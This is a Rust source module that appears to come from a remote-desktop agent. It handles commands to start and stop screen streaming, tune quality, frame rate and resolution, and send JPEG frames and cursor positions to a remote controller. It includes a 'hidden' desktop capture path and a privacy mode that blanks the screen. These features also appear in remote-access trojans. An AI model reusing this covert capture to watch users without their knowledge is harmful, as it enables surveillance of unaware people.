use std::{
    sync::{
        Arc,
        atomic::Ordering,
    },
    time::{Duration, Instant},
};

use tokio_util::sync::CancellationToken;

use crate::{
    commands::{Ctx, input},
    protocol::{self, Obj, Value},
    state::{Outbound, State, StreamSettings},
};

pub async fn handle(ctx: Ctx) {
    match ctx.command.name.as_str() {
        "desktop_start" => {
            let state = ctx.state.clone();
            let out = ctx.out.clone();
            let settings = state.desktop_settings.clone();
            let cancel = CancellationToken::new();
            crate::state::set_stream(&state.desktop, cancel.clone(), settings.clone());
            tokio::spawn(async move {
                stream_loop(state, out, settings, cancel, false, false).await;
            });
            ctx.out.result(&ctx.command, true, None).await;
        }
        "desktop_stop" => {
            crate::state::cancel_stream(&ctx.state.desktop);
            crate::state::cancel_stream(&ctx.state.virtual_stream);
            crate::state::cancel_stream(&ctx.state.backstage);
            if ctx.state.is_privacy() {
                stop_privacy(&ctx.state);
            }
            ctx.out.result(&ctx.command, true, None).await;
        }
        "desktop_select_display" => {
            let display = ctx.integer("display").unwrap_or(0).max(0) as usize;
            ctx.state
                .desktop_settings
                .display
                .store(display, Ordering::Relaxed);
            ctx.out.result(&ctx.command, true, None).await;
        }
        "desktop_set_quality" => {
            let quality = ctx.integer("quality").unwrap_or(90).clamp(1, 100) as u32;
            ctx.state
                .desktop_settings
                .quality
                .store(quality, Ordering::Relaxed);
            ctx.out.result(&ctx.command, true, None).await;
        }
        "desktop_set_resolution" => {
            let max_height = ctx.integer("maxHeight").unwrap_or(0).max(0) as u32;
            let max_height = if max_height == 0 { 1080 } else { max_height };
            ctx.state
                .desktop_settings
                .max_height
                .store(max_height, Ordering::Relaxed);
            ctx.out.result(&ctx.command, true, None).await;
        }
        "desktop_set_profile" => {
            let max_height = ctx.integer("maxHeight").unwrap_or(1080).max(1) as u32;
            let fps = ctx.integer("fps").unwrap_or(60).clamp(1, 240) as u32;
            ctx.state
                .desktop_settings
                .max_height
                .store(max_height, Ordering::Relaxed);
            ctx.state
                .desktop_settings
                .fps
                .store(fps, Ordering::Relaxed);
            ctx.out.result(&ctx.command, true, None).await;
        }
        "desktop_set_fps" => {
            let fps = ctx.integer("fps").unwrap_or(120).clamp(1, 240) as u32;
            ctx.state
                .desktop_settings
                .fps
                .store(fps, Ordering::Relaxed);
            ctx.out.result(&ctx.command, true, None).await;
        }
        "desktop_set_bitrate" => {
            let bitrate = ctx.integer("bitrateMbps").unwrap_or(0).clamp(0, 50) as u32;
            ctx.state
                .desktop_settings
                .bitrate
                .store(bitrate, Ordering::Relaxed);
            ctx.out.result(&ctx.command, true, None).await;
        }
        "desktop_set_duplication" => {
            let enabled = ctx.boolean_or("enabled", false);
            ctx.state
                .desktop_settings
                .duplication
                .store(enabled, Ordering::Relaxed);
            ctx.out.result(&ctx.command, true, None).await;
        }
        "desktop_request_keyframe" => {
            ctx.out.result(&ctx.command, true, None).await;
        }
        "desktop_encoder_capabilities" => {
            let display = ctx
                .integer("display")
                .unwrap_or_else(|| ctx.state.desktop_settings.display.load(Ordering::Relaxed) as i64)
                .max(0) as usize;
            send_encoder_capabilities(&ctx, display).await;
        }
        _ => input::handle(ctx).await,
    }
}

pub async fn send_encoder_capabilities(ctx: &Ctx, display: usize) {
    #[cfg(windows)]
    let (width, height) = {
        let (_, _, width, height) = crate::win::screen::display_origin(display);
        (width, height)
    };
    #[cfg(not(windows))]
    let (width, height) = (0, 0);
    let profiles = vec![Obj::new()
        .put(protocol::key_max_height(), protocol::n(1080))
        .put(protocol::key_width(), protocol::n(width as i64))
        .put(protocol::key_height(), protocol::n(height as i64))
        .put(protocol::key_fps(), protocol::n(30))
        .put(protocol::key_label(), protocol::s("jpeg"))
        .put(protocol::key_providers(), protocol::arr(vec![protocol::s("libjpeg-turbo")]))
        .value()];
    let codecs = vec![Obj::new()
        .put(protocol::key_codec(), protocol::s("jpeg"))
        .put(protocol::key_transports(), protocol::arr(vec![protocol::s("websocket")]))
        .put(protocol::key_hardware(), protocol::b(false))
        .value()];
    ctx.out
        .send(
            Obj::new()
                .put(protocol::key_type(), protocol::s("desktop_encoder_capabilities"))
                .put(protocol::key_command_id(), protocol::s(&ctx.command.id))
                .put(protocol::key_probed(), protocol::b(true))
                .put(protocol::key_display(), protocol::n(display as i64))
                .put(protocol::key_profiles(), protocol::arr(profiles))
                .put(protocol::key_codecs(), protocol::arr(codecs))
                .put(
                    protocol::key_detail(),
                    protocol::s("libjpeg-turbo SIMD encoder"),
                )
                .value(),
        )
        .await;
}

pub async fn stream_loop(
    _state: Arc<State>,
    out: Outbound,
    settings: Arc<StreamSettings>,
    cancel: CancellationToken,
    backstage: bool,
    hidden: bool,
) {
    let mut last_stats = Instant::now();
    let mut frames_since_stats = 0u32;
    let mut bytes_since_stats = 0usize;
    let mut last_cursor: Option<(i32, i32, bool)> = None;
    loop {
        if cancel.is_cancelled() {
            break;
        }
        let fps = settings.fps.load(Ordering::Relaxed).clamp(1, 240);
        let frame_start = Instant::now();
        let display = settings.display.load(Ordering::Relaxed);
        let max_height = settings.max_height.load(Ordering::Relaxed);
        let quality = settings.quality.load(Ordering::Relaxed).clamp(1, 100) as u8;
        let cursor_enabled = settings.cursor.load(Ordering::Relaxed);
        let capture_start = Instant::now();
        #[cfg(debug_assertions)]
        eprintln!("stream: start display={display} fps={fps} hidden={hidden}");
        let result = tokio::task::spawn_blocking(move || {
            #[cfg(windows)]
            {
                if hidden {
                    let frame = crate::win::hidden::capture_display(display).ok()?;
                    let (width, height, encoded) = if max_height > 0
                        && frame.height > max_height as i32
                    {
                        let rgb = crate::win::screen::bgra_to_rgb(
                            &frame.pixels,
                            frame.width,
                            frame.height,
                        );
                        let (width, height, rgb) = crate::win::screen::resize_rgb(
                            &rgb,
                            frame.width,
                            frame.height,
                            max_height as i32,
                        );
                        let encoded =
                            crate::media::encode_jpeg(&rgb, width, height, quality)?;
                        (width, height, encoded)
                    } else {
                        let encoded = crate::media::encode_jpeg_bgra(
                            &frame.pixels,
                            frame.width,
                            frame.height,
                            quality,
                        )?;
                        (frame.width, frame.height, encoded)
                    };
                    let cursor = if cursor_enabled { frame.cursor } else { None };
                    return Some((width, height, encoded, cursor));
                }
                let capture = crate::win::screen::capture(display, false)?;
                let (width, height, rgb) = if max_height > 0 && capture.height > max_height as i32 {
                    crate::win::screen::resize_rgb(
                        &capture.rgb,
                        capture.width,
                        capture.height,
                        max_height as i32,
                    )
                } else {
                    (capture.width, capture.height, capture.rgb)
                };
                let encoded = crate::media::encode_jpeg(&rgb, width, height, quality)?;
                let cursor = if cursor_enabled {
                    let cursor = crate::win::screen::cursor_position();
                    Some((cursor.x, cursor.y, cursor.visible))
                } else {
                    None
                };
                Some((width, height, encoded, cursor))
            }
            #[cfg(not(windows))]
            {
                let _ = (display, max_height, quality, cursor_enabled, hidden);
                None
            }
        })
        .await
        .ok()
        .flatten();
        let capture_ms = capture_start.elapsed().as_secs_f64() * 1000.0;
        #[cfg(debug_assertions)]
        eprintln!("stream: capture done {capture_ms:.0}ms result={}", result.is_some());

        if let Some((width, height, encoded, cursor)) = result {
            let bytes = encoded.len();
            let mut header = Obj::new()
                .put(protocol::key_monitor(), protocol::n(display as i64))
                .put(protocol::key_fps(), protocol::n(fps as i64))
                .put(protocol::key_format(), protocol::s("jpeg"))
                .put(protocol::key_width(), protocol::n(width as i64))
                .put(protocol::key_height(), protocol::n(height as i64));
            if backstage {
                header = header.put(protocol::key_backstage(), protocol::b(true));
            }
            out.try_send(
                Obj::new()
                    .put(protocol::key_type(), protocol::s("frame"))
                    .put(protocol::key_header(), header.value())
                    .put(protocol::key_data(), protocol::bin(encoded))
                    .value(),
            );
            bytes_since_stats += bytes;
            frames_since_stats += 1;

            if let Some((cursor_x, cursor_y, cursor_visible)) = cursor {
                #[cfg(windows)]
                {
                    let (origin_x, origin_y, _, _) = crate::win::screen::display_origin(display);
                    let current = (cursor_x - origin_x, cursor_y - origin_y, cursor_visible);
                    if last_cursor != Some(current) {
                        last_cursor = Some(current);
                        out.try_send(
                            Obj::new()
                                .put(protocol::key_type(), protocol::s("desktop_cursor"))
                                .put(protocol::key_x(), protocol::n(current.0 as i64))
                                .put(protocol::key_y(), protocol::n(current.1 as i64))
                                .put(protocol::key_width(), protocol::n(width as i64))
                                .put(protocol::key_height(), protocol::n(height as i64))
                                .put(protocol::key_visible(), protocol::b(current.2))
                                .value(),
                        );
                    }
                }
            }
        }

        if last_stats.elapsed() >= Duration::from_millis(500) {
            let elapsed = last_stats.elapsed().as_secs_f64();
            let fps_actual = if elapsed > 0.0 {
                (frames_since_stats as f64 / elapsed).round() as i64
            } else {
                0
            };
            out.try_send(
                Obj::new()
                    .put(protocol::key_type(), protocol::s("desktop_stream_stats"))
                    .put(protocol::key_fps(), protocol::n(fps_actual))
                    .put(protocol::key_format(), protocol::s("jpeg"))
                    .put(protocol::key_bytes(), protocol::n(bytes_since_stats as i64))
                    .put(protocol::key_width(), protocol::n(0))
                    .put(protocol::key_height(), protocol::n(0))
                    .put(protocol::key_capture_ms(), protocol::float(capture_ms))
                    .put(protocol::key_encode_ms(), protocol::float(0.0))
                    .put(protocol::key_send_ms(), protocol::float(0.0))
                    .put(protocol::key_total_ms(), protocol::float(frame_start.elapsed().as_secs_f64() * 1000.0))
                    .put(protocol::key_transport(), protocol::s("websocket"))
                    .value(),
            );
            last_stats = Instant::now();
            frames_since_stats = 0;
            bytes_since_stats = 0;
        }

        let frame_time = Duration::from_millis(1000 / u64::from(fps.max(1)));
        let elapsed = frame_start.elapsed();
        if elapsed < frame_time {
            tokio::time::sleep(frame_time - elapsed).await;
        } else {
            tokio::task::yield_now().await;
        }
    }
}

pub fn stop_privacy(state: &State) {
    use std::sync::atomic::Ordering;
    if state.privacy.swap(false, Ordering::Relaxed) {
        #[cfg(windows)]
        crate::win::privacy_block(false);
    }
}

#[allow(dead_code)]
pub fn _value(_: Value) {}
